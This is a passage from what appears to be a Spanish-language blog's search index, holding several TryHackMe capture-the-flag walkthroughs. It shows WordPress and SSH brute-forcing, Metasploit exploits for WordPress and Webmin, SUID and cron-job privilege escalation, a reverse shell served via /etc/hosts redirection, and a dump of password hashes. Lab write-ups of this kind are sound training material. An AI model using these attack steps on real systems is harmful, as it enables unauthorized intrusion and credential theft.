http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:06 \u0026lt;====================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:06 [i] User(s) Identified: [+] kwheel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] bjoel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Karen Wheeler | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [+] Billy Joel | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up. [+] Finished: Thu Jul 23 16:53:07 2020 [+] Requests Done: 24 [+] Cached Requests: 35 [+] Data Sent: 6.06 KB [+] Data Received: 154.571 KB [+] Memory used: 117.724 MB [+] Elapsed time: 00:00:19   Utilizamos wpscan para hacer un ataque de fuerza bruta con los usuarios que encontramos, primero intentamos con el usuario kwheel al que logramos encontrar la contraseña.\nWWW-DATA - USER Con las credenciales que encontramos, editamos el archivo, pero no podemos realizar alguna modificacion a los archivos.\nBuscamos exploits/vulnerabilidades de la version de wordpress y vemos un exploit para metasploit que afecta esta version.\n1 2 3 4 5 6 7 8 9 10  root@upset:~/thm/blog# searchsploit wordpress 5.0 ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- WordPress 5.0.0 - Crop-image Shell Upload (Metasploit) | exploits/php/remote/46662.rb [ ... REDACTED ...] ---------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result   Utilizamos metasploit con el exploit que encontramos y logramos obtener una shell en la maquina con el usuario www-data.\nEn el directorio /home/bjoel encontramos la \u0026ldquo;flag user.txt\u0026rdquo; pero no contiene lo que buscamos, además encontramos un pdf que tiene informacion sobre Rubber Ducky.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  www-data@blog:/home/bjoel$ ls -lah total 100K drwxr-xr-x 4 bjoel bjoel 4.0K May 26 20:08 . drwxr-xr-x 3 root root 4.0K May 26 18:02 .. lrwxrwxrwx 1 root root 9 May 26 18:18 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 bjoel bjoel 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 bjoel bjoel 3.7K Apr 4 2018 .bashrc drwx------ 2 bjoel bjoel 4.0K May 25 13:15 .cache drwx------ 3 bjoel bjoel 4.0K May 25 13:15 .gnupg -rw-r--r-- 1 bjoel bjoel 807 Apr 4 2018 .profile -rw-r--r-- 1 bjoel bjoel 0 May 25 13:16 .sudo_as_admin_successful -rw-r--r-- 1 bjoel bjoel 68K May 26 18:33 Billy_Joel_Termination_May20-2020.pdf -rw-r--r-- 1 bjoel bjoel 57 May 26 20:08 user.txt www-data@blog:/home/bjoel$ cat user.txt cat user.txt You won\u0026#39;t find what you\u0026#39;re looking for here. TRY HARDER www-data@blog:/home/bjoel$   Billy_Joel_Termination_May20-2020.pdf\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la maquina por binarios/archivos SUID, encontramos un archivo ejecutable, al ejecutarlo nos muestra un mensaje de Not an Admin.\n1 2 3 4 5 6 7  ind / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah [... REDACTED ...] -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-sr-x 1 root root 8.3K May 26 18:27 /usr/sbin/checker file /usr/sbin/checker /usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped   Revisamos los strings del ejecutable y encontramos algunos strings interesantes, como /bin/bash, setuid, puts, getenv, system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid puts getenv system [... REDACTED ...] admin /bin/bash Not an Admin ;*3$\u0026#34; GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones [... REDACTED ...]   Utilizamos Ghidra para analizar el archivo, vemos la funcion main, donde tiene una variable que obtiene (getenv()) la variable admin, en el caso de que esta variable este vacia se cierra el programa, en otro caso retorna una shell con usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  undefined8 main(void) { char *pcVar1; pcVar1 = getenv(\u0026#34;admin\u0026#34;); if (pcVar1 == (char *)0x0) { puts(\u0026#34;Not an Admin\u0026#34;); } else { setuid(0); system(\u0026#34;/bin/bash\u0026#34;); } return 0; }   En la maquina creamos la variable $admin a quien le pasamos un directorio cualquiera, ejecutamos el ejecutable y logramos obtener una shell con usuario root y la flag root.txt.\nFinalmente, buscamos la flag user.txt.\nDATABASE BLOG Logramos entrar al servicio de mysql sin credenciales utilizando el usuario root, donde encontramos las credenciales de los usuarios de la base de datos de wordpress (blog).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  +--------------------+ | Database | +--------------------+ | information_schema | | blog | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) +-----------------------+ | Tables_in_blog | +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ 12 rows in set (0.00 sec) mysql\u0026gt; describe wp_users; +---------------------+---------------------+------+-----+---------------------+----------------+ | Field | Type | Null | Key | Default | Extra | +---------------------+---------------------+------+-----+---------------------+----------------+ | ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | user_login | varchar(60) | NO | MUL | | | | user_pass | varchar(255) | NO | | | | | user_nicename | varchar(50) | NO | MUL | | | | user_email | varchar(100) | NO | MUL | | | | user_url | varchar(100) | NO | | | | | user_registered | datetime | NO | | 0000-00-00 00:00:00 | | | user_activation_key | varchar(255) | NO | | | | | user_status | int(11) | NO | | 0 | | | display_name | varchar(250) | NO | | | | +---------------------+---------------------+------+-----+---------------------+----------------+ 10 rows in set (0.00 sec) mysql\u0026gt; select * from wp_users; +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | 1 | bjoel | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel | nconkl1@outlook.com | | 2020-05-26 03:52:26 | | 0 | Billy Joel | | 3 | kwheel | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel | zlbiydwrtfjhmuuymk@ttirv.net | | 2020-05-26 03:57:39 | | 0 | Karen Wheeler | +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ 2 rows in set (0.00 sec)   ","description":"","id":7,"section":"posts","tags":["linux"],"title":"TryHackMe - Blog","uri":"https://sckull.github.io/posts/blog/"},{"content":"JoyStick es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo JoyStick     Info Anyone want to play?   Puntos 60   Dificultad Facil   Maker DarkStar7471    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Fri Jul 17 00:47:51 2020 as: nmap -sV -o nmap_scan_mini joystick.thm Nmap scan report for joystick.thm (10.10.184.33) Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 00:48:28 2020 -- 1 IP address (1 host up) scanned in 37.10 seconds   FTP Intentamos ingresar con credenciales de anonymous en el servicio de FTP pero nos muestra un mensaje de error.\n1 2 3 4 5 6 7 8  root@upset:~/thm/joystick# ftp joystick.thm Connected to joystick.thm. 220 (vsFTPd 3.0.3) Name (joystick.thm:root): anonymous 500 OOPS: vsftpd: refusing to run with writable root inside chroot() Login failed. ftp\u0026gt; exit 421 Service not available, remote server has closed connection   HTTP Encontramos una pagina web en el puerto 80, en el codigo fuente encontramos un mensaje que menciona el usuario steve.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2  root@upset:~/thm/joystick# gobuster dir -u http://joystick.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 200)   STEVE - USER Utilizamos hydra para hacer un ataque de fuerza bruta en el servicio ssh con el usuario steve y el wordlist rockyou.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@upset:~/thm/joystick# hydra -l steve -P /usr/share/wordlists/rockyou.txt ssh://joystick.thm -t 64 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-17 01:12:12 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking ssh://joystick.thm:22/ [STATUS] 233.00 tries/min, 233 tries in 00:01h, 14344194 to do in 1026:04h, 64 active [STATUS] 215.00 tries/min, 645 tries in 00:03h, 14343800 to do in 1111:56h, 64 active [STATUS] 210.29 tries/min, 1472 tries in 00:07h, 14342999 to do in 1136:48h, 64 active [STATUS] 207.53 tries/min, 3113 tries in 00:15h, 14341391 to do in 1151:45h, 64 active [STATUS] 343.68 tries/min, 10654 tries in 00:31h, 14333874 to do in 695:08h, 64 active [22][ssh] host: joystick.thm\tlogin: steve password: [... snip ...] ^C   Ingresamos por SSH, obtenemos una shell y nuestra flag user.txt\nPRIVILEGE ESCALATION Utilizamos pspy64 para ver los cronjobs que se encuentran en la maquina, encontramos que se ejecuta el archivo /opt/minecraft/backup.sh.\nAgregamos una shell inversa al archivo y ponemos a la escucha netcat en nuestra maquina.\nObtenemos una shell con el usuario root.\nEncontramos la flag root.txt en /home/notch.\n","description":"","id":8,"section":"posts","tags":["linux"],"title":"TryHackMe - JoyStick","uri":"https://sckull.github.io/posts/joystick/"},{"content":"Overpass es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Overpass     Info What happens when some broke CompSci students make a password manager?   Puntos 160   Dificultad Facil   Maker NinjaJc01    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Fri Jul 17 16:58:39 2020 as: nmap -sV -o nmap_scan_mini overpass.thm Nmap scan report for overpass.thm (10.10.144.83) Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 16:59:17 2020 -- 1 IP address (1 host up) scanned in 37.41 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9  root@upset:~/thm/overpass# gobuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 301) /img (Status: 301) /downloads (Status: 301) /aboutus (Status: 301) /admin (Status: 301) /admin.html (Status: 200) /css (Status: 301) /404.html (Status: 200)   En admin encontramos un panel, en el codigo fuente de este encontramos un archivo de javascript el cual al enviar el usuario y contraseña este verifica si la respuesta es \u0026quot;Incorrect Credentials\u0026quot;, si ese fuera el caso limpia el input de la contraseña, si la respuesta es diferente entonces establece una cookie con la respuesta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [ ... REDACTED ...] async function login() { const usernameBox = document.querySelector(\u0026#34;#username\u0026#34;); const passwordBox = document.querySelector(\u0026#34;#password\u0026#34;); const loginStatus = document.querySelector(\u0026#34;#loginStatus\u0026#34;); loginStatus.textContent = \u0026#34;\u0026#34; const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\u0026#34;/api/login\u0026#34;, creds) const statusOrCookie = await response.text() if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } }   JAMES - USER En este caso no hay un control encuanto a las cookies por lo que podemos establecer una cookie cualquiera o vacia y logramos ver lo que esta restringido, utilizamos burpsuite para establecer la cookie en vacio y logramos ver el contenido, en donde nos muestra una clave privada encriptada y el nombre de un usuario (james).\nUtilizamos ssh2john para obtener el hash y john para obtener la frase del archivo.\nUtilizamos la frase y la clave, logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con cat /etc/crontab y encontramos un cronjob del usuario root, en el que descarga un archivo bash y lo ejecuta en la direccion overpass.thm.\nEditamos el archivo /etc/hosts y agregamos nuestra ip en lugar de la de overpass.thm.\nCreamos un archivo con una shell inversa, creamos un mini servidor con python3 -m http.server 80, ademas creamos dos carpetas /downloads/src/ en donde estará nuestro archivo de la shell. Esperamos a que haga la solicitud y ejecute nuestro archivo, logramos obtener una shell root y la flag root.txt.\n","description":"","id":9,"section":"posts","tags":["linux"],"title":"TryHackMe - Overpass","uri":"https://sckull.github.io/posts/overpass/"},{"content":"Source es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Source     Info Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.   Maker DarkStar7471    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (10000) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Fri Jul 17 02:32:30 2020 as: nmap -sV -o nmap_scan_mini source.thm Nmap scan report for source.thm (10.10.133.161) Host is up (0.15s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 10000/tcp open http MiniServ 1.890 (Webmin httpd) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 02:33:40 2020 -- 1 IP address (1 host up) scanned in 69.98 seconds   HTTP Encontramos webmin en el puerto 10000.\nMETASPLOIT Utilizamos metasploit en donde encontramos el exploit exploit/unix/webapp/webmin_backdoor y lo usamos en contra la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  msf5 \u0026gt; search webmin Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/webmin/edit_html_fileaccess 2012-09-06 normal No Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access 1 auxiliary/admin/webmin/file_disclosure 2006-06-30 normal No Webmin File Disclosure 2 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution 3 exploit/unix/webapp/webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor 4 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin /file/show.cgi Remote Command Execution 5 exploit/unix/webapp/webmin_upload_exec 2019-01-17 excellent Yes Webmin Upload Authenticated RCE msf5 \u0026gt;   Logramos obtener una shell con el usuario root.\nTambien encontramos la flag user.txt y root.txt\n","description":"","id":10,"section":"posts","tags":["linux"],"title":"TryHackMe - Source","uri":"https://sckull.github.io/posts/source/"},{"content":"KoTH Food CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo KoTH Food CTF     Info April 2020 KoTH box   Puntos *   Dificultad Media   Maker NinjaJc01    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (15065), mysql (3306) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  # Nmap 7.80 scan initiated Tue Jul 14 23:33:16 2020 as: nmap -sV -o nmap_scan_mini kothfood.thm Nmap scan report for kothfood.thm (10.10.77.34) Host is up (0.15s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1 9999/tcp open abyss? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : [... snip ...] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 14 23:35:18 2020 -- 1 IP address (1 host up) scanned in 122.15 seconds # Nmap 7.80 scan initiated Tue Jul 14 23:48:02 2020 as: nmap -sV -p- -T5 -o nmap_scan kothfood.thm Warning: 10.10.132.29 giving up on port because retransmission cap hit (2). Nmap scan report for kothfood.thm (10.10.132.29) Host is up (0.16s latency). Not shown: 65523 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1 9999/tcp open abyss? 15065/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 16109/tcp open unknown 32229/tcp filtered unknown 46211/tcp filtered unknown 46969/tcp open telnet Linux telnetd 47002/tcp filtered unknown 48690/tcp filtered unknown 48972/tcp filtered unknown 52197/tcp filtered unknown 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : [... snip ...] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 15 00:01:53 2020 -- 1 IP address (1 host up) scanned in 830.63 seconds   Primera Parte A continuacion se muestran los dos caminos (partes) que se encontraron para obtener una shell y escalar privilegios, además el lugar donde se encuentran las flags.\nMYSQL Nos conecatmos en el puerto 3306 con las credenciales por default (root:), en donde encontramos una base de datos (users) que contiene unas credenciales y una flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  MySQL [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | users | +--------------------+ 5 rows in set (0.176 sec) MySQL [(none)]\u0026gt; use users; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [users]\u0026gt; show tables; +-----------------+ | Tables_in_users | +-----------------+ | User | +-----------------+ 1 row in set (0.152 sec) MySQL [users]\u0026gt; select * from User; +----------+---------------------------------------+ | username | password | +----------+---------------------------------------+ | ramen | ... snip ... | | flag | thm{... snip ...} | +----------+---------------------------------------+ 2 rows in set (0.149 sec) MySQL [users]\u0026gt;   RAMEN - USER Utilizamos las credenciales que encontramos en la base de datos en el servicio SSH, logramos obtener una shell.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la maquina y encontramos un archivo SUID screen-4.5.0. Ejecutamos el exploit y obtenemos una shell como usuario root.\nObtenemos una flag en la carpeta principal de este usuario.\nBuscamos la flag en el directorio / y logramos encontrar una en /home/bread/flag, /home/tryhackme/flag7 y /var/flag.txt.\nEncontramos otra dentro de la carpeta principal del usuario food (/home/food/.flag).\nVemos los puertos abiertos y nos muestra el puerto 16109, visitamos el puerto y vemos una imagen.\nDescargamos la imagen y extraemos archivos ocultos con steghide sin contraseña, donde encontramos las credenciales del usuario pasta.\nroot@upset:~/thm/kothfood# steghide extract -sf image.jpg Enter passphrase: wrote extracted data to \u0026quot;creds.txt\u0026quot;. root@upset:~/thm/kothfood# cat creds.txt pasta:... snip ... root@upset:~/thm/kothfood# Segunda Parte HTTP Encontramos una pagina web en el puerto 15065.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/kothfood# gobuster dir -u http://kothfood.thm:15065/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 301) /monitor (Status: 301)   En la pagina monitor en donde al pasarle una ip realiza un ping.\nLe pasamos nuestra IP y logramos recibir los paquetes.\nRevisamos el codigo fuente de la pagina y encontramos un archivo de javascript, que, en uno de los comentarios indica que el codigo está ofuscado. Encontramos una funcion que envia la IP a una API.\n1 2 3 4 5 6 7 8 9 10 11 12  async function pingHost() { const _0x25c165 = document[_0x4d67(\u0026#39;0x5\u0026#39;)](\u0026#39;#outputSection\u0026#39;); const _0x2e78af = document[_0x4d67(\u0026#39;0x5\u0026#39;)](_0x4d67(\u0026#39;0x2\u0026#39;)); const _0x1185f3 = _0x2e78af[_0x4d67(\u0026#39;0x1\u0026#39;)]; if (_0x1185f3 !== undefined \u0026amp;\u0026amp; _0x1185f3 !== \u0026#39;\u0026#39; \u0026amp;\u0026amp; ValidateIPaddress(_0x1185f3)) { _0x25c165[_0x4d67(\u0026#39;0x0\u0026#39;)] = _0x4d67(\u0026#39;0x6\u0026#39;) + _0x1185f3 + \u0026#39;\\x0a\u0026#39;; const _0x27c227 = await postData(\u0026#39;/api/cmd\u0026#39;, \u0026#39;ping -c 4 \u0026#39; + _0x1185f3); _0x25c165[\u0026#39;textContent\u0026#39;] += await _0x27c227[\u0026#39;text\u0026#39;](); } else { _0x25c165[_0x4d67(\u0026#39;0x0\u0026#39;)] = _0x4d67(\u0026#39;0x4\u0026#39;); } }   Enviamos un comando mediante el metodo POST utilizando CURL y logramos obtener el resultado.\nEjecutamos una shel inversa y logramos obtener una shell inversa con el usuario BREAD.\nGeneramos claves SSH para el usuario bread.\nAdemás agregamos nuestra clave en el archivo authorized_keys.\nIngresamos por el servicio ssh y enumeramos la maquina para buscar archivos para escalar privilegios.\n-rwsr-xr-x 1 root root 8.3K Jul 15 05:07 /tmp/rootshell -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 1.6M Mar 20 03:04 /usr/bin/screen-4.5.0 -rwsr-xr-x 1 root root 146K Jan 18 2018 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-sr-x 1 root root 2.6M Jun 6 2019 /usr/bin/vim.basic -rwsr-xr-- 1 root messagebus 42K Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-sr-x 1 root root 107K Oct 30 2019 /usr/lib/snapd/snap-confine -rwsr-xr-- 1 root telnetd 11K Nov 7 2016 /usr/lib/telnetlogin -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic Encontramos un binario que al ejecutarlo /tmp/rootshell nos devuelve una shell como usuario root.\n","description":"","id":11,"section":"posts","tags":["linux"],"title":"TryHackMe - KoTH Food CTF","uri":"https://sckull.github.io/posts/kothfood/"},{"content":"KoTH Hackers es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo KoTH Hackers     Info May 2020 rotation KoTH box   Puntos *   Dificultad Media   Maker NinjaJc01    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm Warning: 10.10.130.16 giving up on port because retransmission cap hit (2). Nmap scan report for kothhacker.thm (10.10.130.16) Host is up (0.15s latency). Not shown: 65488 closed ports, 43 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 9999/tcp open abyss? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.80%I=7%D=7/10%Time=5F08E4C8%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,75,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x2010\\x20Jul\\x2020 SF:20\\x2021:59:36\\x20GMT\\r\\nContent-Length:\\x201\\r\\nContent-Type:\\x20text/ SF:plain;\\x20charset=utf-8\\r\\n\\r\\n\\n\u0026#34;)%r(HTTPOptions,75,\u0026#34;HTTP/1\\.0\\x20200\\ SF:x20OK\\r\\nDate:\\x20Fri,\\x2010\\x20Jul\\x202020\\x2021:59:36\\x20GMT\\r\\nConte SF:nt-Length:\\x201\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\ SF:n\\n\u0026#34;)%r(FourOhFourRequest,75,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x SF:2010\\x20Jul\\x202020\\x2021:59:37\\x20GMT\\r\\nContent-Length:\\x201\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\n\\n\u0026#34;)%r(GenericLines,67, SF:\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20 SF:charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r( SF:RTSPRequest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T SF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400 SF:\\x20Bad\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Req 